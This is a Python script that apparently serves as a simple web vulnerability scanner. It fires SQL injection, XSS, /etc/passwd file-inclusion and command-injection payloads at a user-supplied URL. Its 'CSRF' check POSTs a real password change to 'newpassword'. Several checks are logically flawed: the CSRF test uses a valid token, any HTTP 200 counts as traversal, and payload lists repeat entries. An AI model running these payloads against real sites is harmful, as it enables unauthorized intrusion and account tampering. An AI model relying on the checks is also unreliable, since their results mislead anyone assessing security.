import requests
from bs4 import BeautifulSoup

url = input("Enter target URL: ")

# Function to check for SQL injection vulnerability
def check_sql_injection(url):
    payloads = ["' OR 1=1--", "' OR '1'='1", "' OR 1=1--", "' OR '1'='1"]
    for payload in payloads:
        injected_url = f"{url}?id={payload}"
        response = requests.get(injected_url)
        if "SQL syntax" in response.text:
            return True
    return False

# Function to check for XSS vulnerability
def check_xss(url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in payloads:
        injected_url = f"{url}?id={payload}"
        response = requests.get(injected_url)
        if payload in response.text:
            return True
    return False

# Function to check for file inclusion vulnerability
def check_file_inclusion(url):
    payloads = ["/etc/passwd", "../../../../etc/passwd"]
    for payload in payloads:
        injected_url = f"{url}?file={payload}"
        response = requests.get(injected_url)
        if "root:" in response.text:
            return True
    return False

# Function to check for command injection vulnerability
def check_command_injection(url):
    payloads = ["; cat /etc/passwd", "&& cat /etc/passwd"]
    for payload in payloads:
        injected_url = f"{url}?cmd={payload}"
        response = requests.get(injected_url)
        if "root:" in response.text:
            return True
    return False

# Function to check for directory traversal vulnerability
def check_directory_traversal(url):
    payloads = ["../", "../../"]
    for payload in payloads:
        injected_url = f"{url}/{payload}"
        response = requests.get(injected_url)
        if response.status_code == 200:
            return True
    return False

# Function to check for CSRF vulnerability
def check_csrf(url):
    # Assume a CSRF token is present in the response
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    
    # Inject the CSRF token into a POST request
    payload = {'csrf_token': csrf_token, 'new_password': 'newpassword'}
    response = requests.post(url, data=payload)
    
    # Check if the password change was successful
    if "Password changed successfully" in response.text:
        return True
    return False

# Main function to perform the vulnerability scan
def perform_scan():
    print("[+] Scanning vulnerabilities...")
    print(f"[!] SQL Injection: {check_sql_injection(url)}")
    print(f"[!] XSS: {check_xss(url)}")
    print(f"[!] File Inclusion: {check_file_inclusion(url)}")
    print(f"[!] Command Injection: {check_command_injection(url)}")
    print(f"[!] Directory Traversal: {check_directory_traversal(url)}")
    print(f"[!] CSRF: {check_csrf(url)}")

# Run the script
perform_scan()
